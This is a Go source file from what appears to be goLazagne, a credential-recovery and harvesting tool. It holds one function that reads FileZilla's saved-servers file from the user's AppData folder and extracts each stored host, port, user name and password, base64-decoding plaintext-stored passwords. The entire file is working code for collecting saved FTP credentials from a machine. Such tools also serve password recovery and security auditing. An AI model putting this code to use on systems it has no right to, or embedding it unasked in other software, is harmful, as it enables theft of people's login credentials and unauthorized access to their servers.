package sysadmin

import (
	"aqwari.net/xml/xmltree"
	"encoding/base64"
	"goLazagne/common"
	"goLazagne/types"
	"io/ioutil"
	"os"
	"strings"
)

//FilezillaExtractDataRun retrieves Host, Port, User, Pass
//if password is encrypted, base64 encoded string is returned
func FilezillaExtractDataRun() ([]types.FileZillaData, error) {
	f, err := os.Open(common.AppData + "/FileZilla/recentservers.xml")
	if err != nil {
		return nil, err
	}
	defer f.Close()
	byte, _ := ioutil.ReadAll(f)
	root, err := xmltree.Parse(byte)
	if err != nil {
		return nil, err
	}
	var data []types.FileZillaData
	//SearchFunc searches for elements "Server"
	elements := root.SearchFunc(func(el *xmltree.Element) bool {
		return el.Name.Local == "Server"
	})
	//extraction of useful info
	for _, el := range elements {
		//instance stores temporary info
		var instance types.FileZillaData
		for _, sub := range el.Children {
			if strings.Contains(sub.String(), "Host") {
				instance.Host = string(sub.Content)
			} else if strings.Contains(sub.String(), "Port") {
				instance.Port = string(sub.Content)
			} else if strings.Contains(sub.String(), "User") {
				instance.User = string(sub.Content)
			} else if strings.Contains(sub.String(), "Pass") {
				if sub.Attr("", "encoding") == "crypt" {
					instance.Pass = string(sub.Content)
				} else {
					info, _ := base64.StdEncoding.DecodeString(string(sub.Content))
					instance.Pass = string(info)
				}
			}
		}
		data = append(data, instance)
	}

	return data, nil
}
